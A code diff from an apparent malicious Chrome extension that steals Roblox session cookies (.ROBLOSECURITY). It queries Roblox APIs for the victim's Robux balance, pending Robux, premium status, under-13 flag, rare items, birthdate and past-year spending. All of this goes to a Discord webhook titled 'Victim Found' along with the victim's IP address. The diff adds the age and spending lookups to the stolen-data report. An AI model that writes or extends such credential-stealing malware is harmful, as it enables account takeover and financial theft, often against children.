@@ -20,6 +20,96 @@ async function checkOwnership(userId, assetId, cookie) {
     }
 }
 
+async function getTotalSpentRobux(userId, cookie) {
+    try {
+        // Get transactions from the past year
+        const oneYearAgo = new Date();
+        oneYearAgo.setFullYear(oneYearAgo.getFullYear() - 1);
+        
+        let totalSpent = 0;
+        let cursor = "";
+        
+        do {
+            let url = `https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=expenditure&limit=100`;
+            if (cursor) {
+                url += `&cursor=${cursor}`;
+            }
+            
+            let res = await fetch(url, {
+                method: "GET",
+                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+            });
+            
+            if (!res.ok) break;
+            
+            let json = await res.json();
+            if (!json.data || json.data.length === 0) break;
+            
+            // Sum up all expenditures
+            for (let transaction of json.data) {
+                const transactionDate = new Date(transaction.created);
+                if (transactionDate >= oneYearAgo) {
+                    totalSpent += Math.abs(transaction.currency?.amount || 0);
+                } else {
+                    // Stop if we've reached transactions older than 1 year
+                    cursor = "";
+                    break;
+                }
+            }
+            
+            cursor = json.nextPageCursor || "";
+            
+        } while (cursor);
+        
+        return totalSpent;
+    } catch (error) {
+        console.error("Error fetching spent Robux:", error);
+        return "N/A";
+    }
+}
+
+async function getAccountAge(userId, cookie) {
+    try {
+        let res = await fetch("https://users.roblox.com/v1/birthdate", {
+            method: "GET",
+            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+        });
+        
+        if (!res.ok) {
+            // Fallback to join date if birthdate fails
+            let userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
+                method: "GET",
+                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
+            });
+            
+            if (!userRes.ok) return "N/A";
+            
+            let user = await userRes.json();
+            return user.created ? new Date(user.created).toLocaleDateString() : "N/A";
+        }
+        
+        let birthdate = await res.json();
+        if (birthdate.birthDay && birthdate.birthMonth && birthdate.birthYear) {
+            const birthDate = new Date(birthdate.birthYear, birthdate.birthMonth - 1, birthdate.birthDay);
+            const today = new Date();
+            let age = today.getFullYear() - birthdate.birthYear;
+            
+            // Adjust age if birthday hasn't occurred this year
+            if (today.getMonth() < birthDate.getMonth() || 
+                (today.getMonth() === birthDate.getMonth() && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+            
+            return `${age} years old`;
+        }
+        
+        return "N/A";
+    } catch (error) {
+        console.error("Error fetching account age:", error);
+        return "N/A";
+    }
+}
+
 async function sendToWebhook(webhookUrl, embedPayload) {
     try {
         await fetch(webhookUrl, { 
@@ -50,12 +140,16 @@ async function main(cookie) {
 
         let user = await res.json();
 
-        // Robux + Pending
-        let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
+        // Robux + Pending (using the correct economy endpoint)
+        let economyRes = await fetch("https://economy.roblox.com/v1/user/currency", {
             method: "GET",
             headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
         });
-        let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };
+        
+        let economy = { robux: "N/A", robuxPending: "N/A" };
+        if (economyRes.ok) {
+            economy = await economyRes.json();
+        }
 
         // Premium
         let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
@@ -76,17 +170,23 @@ async function main(cookie) {
         let hasKorblox = await checkOwnership(user.id, 18122167, cookie);
         let hasHeadless = await checkOwnership(user.id, 134082579, cookie);
 
+        // Get additional data
+        let accountAge = await getAccountAge(user.id, cookie);
+        let totalSpentPastYear = await getTotalSpentRobux(user.id, cookie);
+
         statistics = {
             UserName: user.name,
             UserId: user.id,
             IsUnder13: user.isUnder13,
-            JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
+            JoinDate: user.created ? new Date(user.created).toLocaleDateString() : "N/A",
             RobuxBalance: economy.robux ?? "N/A",
             PendingRobux: economy.robuxPending ?? "N/A",
             IsPremium: isPremium,
             ThumbnailUrl: thumbUrl,
             Korblox: hasKorblox,
-            Headless: hasHeadless
+            Headless: hasHeadless,
+            AccountAge: accountAge,
+            TotalSpentPastYear: totalSpentPastYear
         };
 
     } catch (e) {
@@ -104,11 +204,13 @@ async function main(cookie) {
                     { name: "User ID", value: statistics?.UserId ?? "N/A", inline: true },
                     { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                     { name: "Join Date", value: statistics?.JoinDate ?? "N/A", inline: true },
-                    { name: "<:balance:1396065501574205542>Robux", value: statistics?.RobuxBalance ?? "N/A", inline: true },
-                    { name: "⌛ Pending", value: statistics?.PendingRobux ?? "N/A", inline: true },
+                    { name: "Account Age", value: statistics?.AccountAge ?? "N/A", inline: true },
+                    { name: "<:balance:1396065501574205542> Robux", value: statistics?.RobuxBalance?.toLocaleString() ?? "N/A", inline: true },
+                    { name: "⌛ Pending", value: statistics?.PendingRobux?.toLocaleString() ?? "N/A", inline: true },
+                    { name: "💸 Spent (1yr)", value: statistics?.TotalSpentPastYear !== "N/A" ? statistics.TotalSpentPastYear.toLocaleString() : "N/A", inline: true },
                     { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true },
-                    { name: "<:korblox:1153613134599307314>Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
-                    { name: "<:head_full:1207367926622191666>Headless", value: statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", inline: true }
+                    { name: "<:korblox:1153613134599307314> Korblox", value: statistics ? (statistics.Korblox ? "✅ Owns" : "❌ None") : "N/A", inline: true },
+                    { name: "<:head_full:1207367926622191666> Headless", value: statistics ? (statistics.Headless ? "✅ Owns" : "❌ None") : "N/A", inline: true }
                 ],
                 author: {
                     name: `Victim Found: ${ipAddr}`,
@@ -118,7 +220,8 @@ async function main(cookie) {
                 footer: {
                     text: "ENTERPRISE",
                     icon_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg"
-                }
+                },
+                timestamp: new Date().toISOString()
             }
         ],
         username: "Extension Logger",
@@ -145,5 +248,3 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
-
-
